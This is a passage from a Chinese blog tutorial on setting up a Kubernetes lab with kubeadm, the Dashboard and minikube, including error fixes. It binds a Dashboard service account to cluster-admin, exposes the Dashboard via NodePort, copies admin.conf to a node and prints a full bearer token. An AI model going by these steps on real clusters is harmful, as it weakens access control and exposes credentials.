src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1665071735663-34b436f7-e3a3-4316-a043-992afd13ab5e.png" alt="img"></p><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1665144889248-ebdfe072-78fa-4802-8fd5-86616b313ab4.png" alt="img"></p><h3 id="报错解决"><a href="#报错解决" class="headerlink" title="报错解决"></a>报错解决</h3><p>​    如果在部署calico.yaml文件的时候碰到如下错误，则是因为<strong>calico版本与k8s版本不匹配导致的，可以参考</strong><a href="https://projectcalico.docs.tigera.io/archive/v3.23/getting-started/kubernetes/requirements%E6%89%BE%E5%88%B0%E5%AF%B9%E5%BA%94%E7%89%88%E6%9C%AC%E7%9A%84calico%E3%80%82">https://projectcalico.docs.tigera.io/archive/v3.23/getting-started/kubernetes/requirements找到对应版本的calico。</a></p><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1665065529996-7c83a1ff-9e87-4fb7-b86e-eb8389d36f86.png" alt="img"></p><p>查看pods的状态，可以看到calico的是Init:ImagePullBackOff</p><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1665068154047-9f90731f-dbcf-4226-a25a-ca7f8446da47.png" alt="img"></p><p>直接去网站进行下载：<a href="https://github.com/projectcalico/calico/releases">https://github.com/projectcalico/calico/releases</a></p><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1665073058104-f164adff-349f-44c7-8efb-3a207f50b01f.png" alt="img"></p><p>下载完成后解压，image文件夹下为docker镜像文件，还原</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">docker load <span class="token operator">&lt;</span> xx<span class="token punctuation">.</span>tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1665073796753-c63e7ec3-813d-406a-a17d-da130038e05b.png" alt="img"></p><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1665073858331-b619dc0b-1930-4341-8c21-0d6757cd0f9d.png" alt="img"></p><p>重新部署</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#移除</span>kubectl delete <span class="token operator">-</span>f calico<span class="token punctuation">.</span>yml<span class="token comment">#部署</span>kubectl <span class="token builtin">apply</span> <span class="token operator">-</span>f calico<span class="token punctuation">.</span>yaml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="部署Dashboard"><a href="#部署Dashboard" class="headerlink" title="部署Dashboard"></a>部署Dashboard</h2><p>Dashboard是官方提供的一个Web UI，可用于基本管理K8s资源，执行如下命令下载yaml文件。默认Dashboard只能集群内部访问，修改Service为NodePort类型，暴露到外部：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">wget https<span class="token punctuation">:</span><span class="token operator">//</span>raw<span class="token punctuation">.</span>githubusercontent<span class="token punctuation">.</span>com<span class="token operator">/</span>kubernetes<span class="token operator">/</span>dashboard<span class="token operator">/</span>v2<span class="token punctuation">.</span><span class="token number">4.0</span><span class="token operator">/</span>aio<span class="token operator">/</span>deploy<span class="token operator">/</span>recommended<span class="token punctuation">.</span>yaml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改如下，nodePort的端口范围为30000-32767，并且添加type：NodePort</p><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1665153907207-b9cf37db-9fa6-4237-988a-598a6c89ee33.png" alt="img"></p><p>执行如下命令应用</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">kubectl <span class="token builtin">apply</span> <span class="token operator">-</span>f recommended<span class="token punctuation">.</span>yaml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1665154008488-c857cf85-32cc-47fe-964c-1bff7e669d7d.png" alt="img"></p><p>在master节点创建service account并绑定默认cluster-admin管理员集群角色</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 在kube-system命名空间下创建名为dashboard-admin的serviceaccount</span>kubectl create serviceaccount dashboard<span class="token operator">-</span>admin <span class="token operator">-</span>n kube<span class="token operator">-</span>system<span class="token comment"># 创建名为dashboard-admin的clusterrolebinding，通过clusterrole绑定集群角色cluster-admin，这样指定账号就有了cluster-admin角色的权限。最后--serviceaccount指定dashboard-admin账号的权限应用在kube-system命名空间下。</span>kubectl create clusterrolebinding dashboard<span class="token operator">-</span>admin <span class="token operator">-</span><span class="token operator">-</span>clusterrole<span class="token operator">=</span>cluster<span class="token operator">-</span>admin <span class="token operator">-</span><span class="token operator">-</span>serviceaccount<span class="token operator">=</span>kube<span class="token operator">-</span>system<span class="token punctuation">:</span>dashboard<span class="token operator">-</span>admin<span class="token comment"># 获取用户Token</span>kubectl describe secrets <span class="token operator">-</span>n kube<span class="token operator">-</span>system $<span class="token punctuation">(</span>kubectl <span class="token operator">-</span>n kube<span class="token operator">-</span>system get secret <span class="token operator">|</span> awk <span class="token string">'/dashboard-admin/&#123;print $1&#125;'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用输出的token登录Dashboard。 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">eyJhbGciOiJSUzI1NiIsImtpZCI6IjNpbzFJbTg4UjlpcjFBdS1rb1J3NzFtY3BETlhtVkQ3S0hXZWwwU0MwN1UifQ<span class="token punctuation">.</span>eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJkYXNoYm9hcmQtYWRtaW4tdG9rZW4tYzdzcHAiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGFzaGJvYXJkLWFkbWluIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiZjAyMTE1OWMtZjcyMC00YTZlLWFiY2MtYzIzYWRhZjBiZjk5Iiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmUtc3lzdGVtOmRhc2hib2FyZC1hZG1pbiJ9<span class="token punctuation">.</span>aD_ZtS0domXxtWz<span class="token operator">-</span>2BaGmZebJMqoNvWqHgJ4K7kQ9eir5JvIqTsrxM14dNrUrEFRZC2hw6Gn_xz7Nezy81XPU64HHcbGiNvNU8<span class="token operator">-</span>K7OwvTWwTOpDBRPho1CaxJsKBrlQwoNf1pzoShqO<span class="token operator">-</span>JdL4kVfJUmKthjUqv8QduwVzEkCWeTXgcHOoPnsOaJSXJzwanAC4e5pIovcjMGQJU4W87T8uVW4bdO4w48c<span class="token operator">-</span><span class="token number">101</span><span class="token operator">-</span>mMYHMouKVRxF8OOTuGHFXUDpYCKAOvfA73gtwoyi_4wiSqS7NSZZTGwFfppUYDomjoA3FUFubZ2xLoc8fN2GoFzzTcylxFHTCfupJM2nUVs9vxQbJw<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1665152527751-3c6c9537-b72a-4d51-949f-adb1927ab9fb.png" alt="img"></p><p><a href="https://master/">https://master</a> ip 或 node ip:31000 均可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">https<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">172.16</span><span class="token number">.200</span><span class="token number">.70</span><span class="token punctuation">:</span><span class="token number">31000</span><span class="token operator">/</span>https<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">172.16</span><span class="token number">.200</span><span class="token number">.71</span><span class="token punctuation">:</span><span class="token number">31000</span><span class="token operator">/</span>https<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">172.16</span><span class="token number">.200</span><span class="token number">.72</span><span class="token punctuation">:</span><span class="token number">31000</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1665153778651-3fb1d011-6f4e-4a09-9630-a692ca30f6fb.png" alt="img"></p><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1665153805017-d0ea311b-2236-4113-9c04-79797cf60cdf.png" alt="img"></p><h2 id="配置node节点使用kubectl-高权限"><a href="#配置node节点使用kubectl-高权限" class="headerlink" title="配置node节点使用kubectl(高权限)"></a>配置node节点使用kubectl(高权限)</h2><p>在master节点执行如下命令，将admin.conf文件拷贝到node节点</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">scp <span class="token operator">/</span>etc<span class="token operator">/</span>kubernetes<span class="token operator">/</span>admin<span class="token punctuation">.</span>conf root@<span class="token number">172.16</span><span class="token number">.200</span><span class="token number">.71</span><span class="token punctuation">:</span><span class="token operator">/</span>etc<span class="token operator">/</span>kubernetes<span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1669041790872-2d545bfb-ef77-4314-8d7a-1f9588ea127f.png" alt="img"></p><p>在node节点执行如下命令配置环境变量，就可以使用kubectl了。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">echo <span class="token string">"export KUBECONFIG=/etc/kubernetes/admin.conf"</span> <span class="token operator">>></span> <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>bash_profilesource <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>bash_profilekubectl <span class="token operator">-</span>s https<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">172.16</span><span class="token number">.200</span><span class="token number">.70</span><span class="token punctuation">:</span><span class="token number">6443</span> cluster<span class="token operator">-</span>info<span class="token comment">#也可以直接指定配置配置文件</span>kubectl <span class="token operator">-</span>s https<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">172.16</span><span class="token number">.200</span><span class="token number">.70</span><span class="token punctuation">:</span><span class="token number">6443</span> <span class="token operator">-</span><span class="token operator">-</span>kubeconfig<span class="token operator">=</span><span class="token operator">/</span>etc<span class="token operator">/</span>kubernetes<span class="token operator">/</span>admin<span class="token punctuation">.</span>conf cluster<span class="token operator">-</span>info<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1669041884961-f61cd2ab-a20b-4255-8d0e-2c05c002b03a.png" alt="img"></p><h2 id="报错解决-1"><a href="#报错解决-1" class="headerlink" title="报错解决"></a>报错解决</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span>kubelet<span class="token operator">-</span>check<span class="token punctuation">]</span> It seems like the kubelet isn't running <span class="token keyword">or</span> healthy<span class="token punctuation">.</span><span class="token punctuation">[</span>kubelet<span class="token operator">-</span>check<span class="token punctuation">]</span> The HTTP call equal to <span class="token string">'curl -sSL http://localhost:10248/healthz'</span> failed <span class="token keyword">with</span> error<span class="token punctuation">:</span> Get <span class="token string">"http://localhost:10248/healthz"</span><span class="token punctuation">:</span> dial tcp <span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token number">10248</span><span class="token punctuation">:</span> connect<span class="token punctuation">:</span> connection refused<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1665062858190-b4599c2c-3fb0-4372-8941-9341a2bfc896.png" alt="img"></p><p>这是因为Docker和 kubelet 服务中的 cgroup 驱动不一致导致的，有两种方法解决：</p><ul><li>方式一：驱动向 docker 看齐</li><li>方式二：驱动为向 kubelet 看齐</li></ul><p>这里使用方式二，驱动向kubelet 看齐。首先查看kubelet的驱动，可以看到为systemd。修改&#x2F;etc&#x2F;docker&#x2F;daemon.json 文件，将其驱动也配置为systemd，然后启动docker即可。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span>  <span class="token string">"exec-opts"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token string">"native.cgroupdriver=systemd"</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token string">"registry-mirrors"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token string">"http://docker-registry-mirror.kodekloud.com"</span>  <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1665063390034-39a9f7f5-72b5-4255-adff-57540659330e.png" alt="img"></p><p>参考：<a href="https://blog.csdn.net/tiny_du/article/details/123823093">https://blog.csdn.net/tiny_du/article/details/123823093</a></p><h1 id="Mac使用minikube搭建"><a href="#Mac使用minikube搭建" class="headerlink" title="Mac使用minikube搭建"></a>Mac使用minikube搭建</h1><p>安装minikube</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">brew install minikube<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1665410528035-8cc9016f-70b8-4506-96d4-ca244e69155f.png" alt="img"></p><p>使用minikube快速启动，这里驱动选的是VMware，指定了k8s的版本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">minikube start <span class="token operator">-</span><span class="token operator">-</span>kubernetes<span class="token operator">-</span>version<span class="token operator">=</span>v1<span class="token punctuation">.</span><span class="token number">16.3</span> <span class="token operator">-</span><span class="token operator">-</span>driver<span class="token operator">=</span>vmware<span class="token comment">#查看pods</span>minikube kubectl <span class="token operator">-</span><span class="token operator">-</span> get pods <span class="token operator">-</span>A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1665411027288-a5f8c337-6692-4859-a9c3-e27baacd17df.png" alt="img"></p><h1 id="使用minikube搭建"><a href="#使用minikube搭建" class="headerlink" title="使用minikube搭建"></a>使用minikube搭建</h1><p>​    项目地址： <a href="https://github.com/kubernetes/minikube/">https://github.com/kubernetes/minikube/</a></p><p>​    相关：<a href="https://minikube.sigs.k8s.io/">https://minikube.sigs.k8s.io/</a></p><p>​    minikube在macOS、Linux和Windows上实现了一个本地K8S集群。minikube的主要目标是成为本地K8S应用程序开发的最佳工具，并支持所有适合的K8S特性。</p><h2 id="安装docker-可选"><a href="#安装docker-可选" class="headerlink" title="安装docker(可选)"></a>安装docker(可选)</h2><p>第一步安装docker就不用说了，参考：<a href="https://www.runoob.com/docker/ubuntu-docker-install.html">Docker的安装</a></p><p>也可以不按照Docker，安装minikube的时候会自动安装。</p><h2 id="安装kubectl-可选"><a href="#安装kubectl-可选" class="headerlink" title="安装kubectl(可选)"></a>安装kubectl(可选)</h2><p>参考：<a href="https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/">https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#下载最新kubectl</span>curl <span class="token operator">-</span>LO <span class="token string">"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"</span><span class="token comment">#下载指定版本的kubectl，比如V1.25.0版本的</span>curl <span class="token operator">-</span>LO https<span class="token punctuation">:</span><span class="token operator">//</span>dl<span class="token punctuation">.</span>k8s<span class="token punctuation">.</span>io<span class="token operator">/</span>release<span class="token operator">/</span>v1<span class="token punctuation">.</span><span class="token number">25.0</span><span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>linux<span class="token operator">/</span>amd64<span class="token operator">/</span>kubectl<span class="token comment">#下载checksum校验文件</span>curl <span class="token operator">-</span>LO <span class="token string">"https://dl.k8s.io/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl.sha256"</span><span class="token comment">#根据checksum校验文件验证下载的kubectl二进制文件</span>echo <span class="token string">"$(cat kubectl.sha256)  kubectl"</span> <span class="token operator">|</span> sha256sum <span class="token operator">-</span><span class="token operator">-</span>check<span class="token comment">#安装kubtctl</span>sudo install <span class="token operator">-</span>o root <span class="token operator">-</span>g root <span class="token operator">-</span>m <span class="token number">0755</span> kubectl <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>kubectl<span class="token comment">#查看安装是否成功</span>kubectl version <span class="token operator">-</span><span class="token operator">-</span>client <span class="token operator">-</span><span class="token operator">-</span>output<span class="token operator">=</span>yaml <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1664977070518-1acfc22b-f1ac-473e-a9ff-fcf617528fae.png" alt="img"></p><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1664985270315-db1a8ba6-c3b6-4949-8de7-33ccc9dd4435.png" alt="img"></p><p>其实不安装kubectl也可以，可以使用minikube里面的kubectl，只不过执行的时候需要加上minikube kubectl。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#自己安装的kubectl</span>kubectl<span class="token comment">#minikube带的</span>minikube kubectl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1665412329870-048215f6-ab1a-4fd1-9f74-8afa29153a52.png" alt="img"></p><h2 id="安装和使用minikube"><a href="#安装和使用minikube" class="headerlink" title="安装和使用minikube"></a>安装和使用minikube</h2><p>项目地址：<a href="https://github.com/kubernetes/minikube/">https://github.com/kubernetes/minikube/</a></p><p>阿里云发布的minikube地址：<a href="https://github.com/AliyunContainerService/minikube">https://github.com/AliyunContainerService/minikube</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#下载minikube1.25.0版本</span>curl <span class="token operator">-</span>Lo minikube https<span class="token punctuation">:</span><span class="token operator">//</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>kubernetes<span class="token operator">/</span>minikube<span class="token operator">/</span>releases<span class="token operator">/</span>download<span class="token operator">/</span>v1<span class="token punctuation">.</span><span class="token number">25.0</span><span class="token operator">/</span>minikube<span class="token operator">-</span>linux<span class="token operator">-</span>amd64<span class="token comment">#赋予执行权限并且移动</span>chmod <span class="token operator">+</span>x minikube <span class="token operator">&amp;</span><span class="token operator">&amp;</span> sudo mv minikube <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span><span class="token comment">#启动minikube，使用阿里的镜像。指定--vm-driver=none参数后，minikube就不会创建minikubevm了，而是会直接在当前系统里安装单节点的k8s集群。启动过程中会下载kubeadm、kubelet和启动过程所需的组件，所以启动过程会比较久，需要耐心等待。</span>minikube start <span class="token operator">-</span><span class="token operator">-</span>kubernetes<span class="token operator">-</span>version<span class="token operator">=</span>v1<span class="token punctuation">.</span><span class="token number">16.3</span> <span class="token operator">-</span><span class="token operator">-</span>registry<span class="token operator">-</span>mirror<span class="token operator">=</span>https<span class="token punctuation">:</span><span class="token operator">//</span>registry<span class="token punctuation">.</span>docker<span class="token operator">-</span>cn<span class="token punctuation">.</span>com <span class="token operator">-</span><span class="token operator">-</span>image<span class="token operator">-</span>repository<span class="token operator">=</span>registry<span class="token punctuation">.</span>cn<span class="token operator">-</span>hangzhou<span class="token punctuation">.</span>aliyuncs<span class="token punctuation">.</span>com<span class="token operator">/</span>google_containers <span class="token operator">-</span><span class="token operator">-</span>vm<span class="token operator">-</span>driver<span class="token operator">=</span>none<span class="token comment">#启动时候的其它参数</span>    <span class="token operator">-</span><span class="token operator">-</span>driver<span class="token operator">=</span><span class="token operator">**</span><span class="token operator">*</span> 从<span class="token number">1.5</span><span class="token number">.0</span>版本开始，Minikube缺省使用系统优选的驱动来创建Kubernetes本地环境，比如您已经安装过Docker环境，minikube 将使用 docker 驱动    <span class="token operator">-</span><span class="token operator">-</span>cpus<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">:</span> 为minikube虚拟机分配CPU核数    <span class="token operator">-</span><span class="token operator">-</span>memory<span class="token operator">=</span>2048mb<span class="token punctuation">:</span> 为minikube虚拟机分配内存数<span class="token comment">#查看minikube的状态</span>minikube status<span class="token comment">#暂停集群</span>minikube pause <span class="token comment">#停止集群</span>minikube stop <span class="token comment">#查看minikube的版本</span>minikube version <span class="token comment">#配置集群内存</span>minikube config <span class="token builtin">set</span> memory <span class="token number">16384</span> <span class="token comment">#查看已安装的附加服务</span>minikube addons <span class="token builtin">list</span>  <span class="token comment">#删除所有的minikube搭建的k8s集群</span>minikube delete <span class="token operator">-</span><span class="token operator">-</span><span class="token builtin">all</span> <span class="token comment">#查看kubectl版本号</span>minikube kubectl version <span class="token comment">#创建负载均衡协调器</span>minikube tunnel <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1665412258797-3542b618-216b-428a-ada8-4ece1d91cebd.png" alt="img"></p><p>执行如下命令，若能显示K8S的pod namespace，则安装成功。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">kubectl get pod <span class="token operator">-</span><span class="token operator">-</span><span class="token builtin">all</span><span class="token operator">-</span>namespaces<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1665412408288-e53e53b7-9548-4492-ae0c-961ad9ac80c7.png" alt="img"></p><p>此时，当前机器被作为了K8S的master节点。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#查看集群信息</span>kubectl cluster<span class="token operator">-</span>info<span class="token comment">#获得nodes</span>kubectl get nodes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1665412502312-4d28ce65-50e5-4a41-bdf9-a9a058626e00.png" alt="img"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">kubectl run hello<span class="token operator">-</span>minikube <span class="token operator">-</span><span class="token operator">-</span>image<span class="token operator">=</span>registry<span class="token punctuation">.</span>cn<span class="token operator">-</span>hangzhou<span class="token punctuation">.</span>aliyuncs<span class="token punctuation">.</span>com<span class="token operator">/</span>google<span class="token operator">-</span>containers<span class="token operator">/</span>echoserver<span class="token punctuation">:</span><span class="token number">1.4</span> <span class="token operator">-</span><span class="token operator">-</span>port<span class="token operator">=</span><span class="token number">8080</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1665412751672-f2280203-b99a-427a-8f03-5f71aa4ff0de.png" alt="img"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#查看指定命名空间内的详细信息</span>kubectl get pods <span class="token operator">-</span>n default <span class="token operator">-</span>o wide<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1665413191094-393aa8b1-3423-4069-a435-1f64b1e8091f.png" alt="img"></p><h3 id="报错解决-2"><a href="#报错解决-2" class="headerlink" title="报错解决"></a>报错解决</h3><p>如果启动的时候碰到下面的报错</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Exiting due to GUEST_MISSING_CONNTRACK<span class="token punctuation">:</span> Sorry<span class="token punctuation">,</span> Kubernetes <span class="token number">1.25</span><span class="token number">.0</span> requires conntrack to be installed <span class="token keyword">in</span> root's path<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1664977674325-3d9a94a7-a04d-450c-99ef-99b5c7b30095.png" alt="img"></p><p>执行如下命令安装conntrack即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">yum install <span class="token operator">-</span>y conntrack<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果启动的时候碰到下面的报错</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">The none driver <span class="token keyword">with</span> Kubernetes v1<span class="token punctuation">.</span><span class="token number">24</span><span class="token operator">+</span> <span class="token keyword">and</span> the docker container<span class="token operator">-</span>runtime requires cri<span class="token operator">-</span>dockerd<span class="token punctuation">.</span>    Please install cri<span class="token operator">-</span>dockerd using these instructions<span class="token punctuation">:</span>    https<span class="token punctuation">:</span><span class="token operator">//</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>Mirantis<span class="token operator">/</span>cri<span class="token operator">-</span>dockerd<span class="token comment">#build-and-install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1664980424335-2a135296-956c-4be6-a2f6-da3a21d080d0.png" alt="img"></p><p>这是因为<a href="https://so.csdn.net/so/search?q=kubernetes&spm=1001.2101.3001.7020">kubernetes</a> 1.24版本正式弃用docker，开始使用containerd作为容器运行时。</p><p>运行时介绍：</p><ul><li>OCI(Open Container Initiative)：2015年Google、docker、Redhat、IBM共同成立，定义了运行标准和镜像标准。</li><li>CRI(Container Runtime Interface)：2016 年12月Kubernetes 发布 CRI(容器运行时接口), 可以支持rkt等不同的运行时。</li><li>CRI-O：由redhat发起并开源，用于替代docker成为kubernetes的运行时，2016年开发,2019年4月8号进入CNCF孵化。</li></ul><p>执行如下命令安装cri-dockerd运行时即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#安装Go</span>wget https<span class="token punctuation">:</span><span class="token operator">//</span>storage<span class="token punctuation">.</span>googleapis<span class="token punctuation">.</span>com<span class="token operator">/</span>golang<span class="token operator">/</span>getgo<span class="token operator">/</span>installer_linuxchmod <span class="token operator">+</span>x <span class="token punctuation">.</span><span class="token operator">/</span>installer_linux<span class="token punctuation">.</span><span class="token operator">/</span>installer_linuxsource <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>bash_profile<span class="token comment">#安装cri-dockerd</span>git clone https<span class="token punctuation">:</span><span class="token operator">//</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>Mirantis<span class="token operator">/</span>cri<span class="token operator">-</span>dockerd<span class="token punctuation">.</span>gitcd cri<span class="token operator">-</span>dockerdmkdir <span class="token builtin">bin</span>go build <span class="token operator">-</span>o <span class="token builtin">bin</span><span class="token operator">/</span>cri<span class="token operator">-</span>dockerdmkdir <span class="token operator">-</span>p <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token builtin">bin</span>install <span class="token operator">-</span>o root <span class="token operator">-</span>g root <span class="token operator">-</span>m <span class="token number">0755</span> <span class="token builtin">bin</span><span class="token operator">/</span>cri<span class="token operator">-</span>dockerd <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>cri<span class="token operator">-</span>dockerdcp <span class="token operator">-</span>a packaging<span class="token operator">/</span>systemd<span class="token operator">/</span><span class="token operator">*</span> <span class="token operator">/</span>etc<span class="token operator">/</span>systemd<span class="token operator">/</span>systemsed <span class="token operator">-</span>i <span class="token operator">-</span>e <span class="token string">'s,/usr/bin/cri-dockerd,/usr/local/bin/cri-dockerd,'</span> <span class="token operator">/</span>etc<span class="token operator">/</span>systemd<span class="token operator">/</span>system<span class="token operator">/</span>cri<span class="token operator">-</span>docker<span class="token punctuation">.</span>servicesystemctl daemon<span class="token operator">-</span><span class="token builtin">reload</span>systemctl enable cri<span class="token operator">-</span>docker<span class="token punctuation">.</span>servicesystemctl enable <span class="token operator">-</span><span class="token operator">-</span>now cri<span class="token operator">-</span>docker<span class="token punctuation">.</span>socket<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果启动的时候碰到下面的报错</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">❌  Exiting due to RUNTIME_ENABLE<span class="token punctuation">:</span> Temporary Error<span class="token punctuation">:</span> sudo crictl version<span class="token punctuation">:</span> exit status <span class="token number">1</span>stdout<span class="token punctuation">:</span>stderr<span class="token punctuation">:</span>sudo<span class="token punctuation">:</span> crictl：找不到命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1664981797086-bda63807-7cc0-4551-b029-56fece269cfd.png" alt="img"></p><p>执行如下命令安装crictl运行时即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">wget https<span class="token punctuation">:</span><span class="token operator">//</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>kubernetes<span class="token operator">-</span>sigs<span class="token operator">/</span>cri<span class="token operator">-</span>tools<span class="token 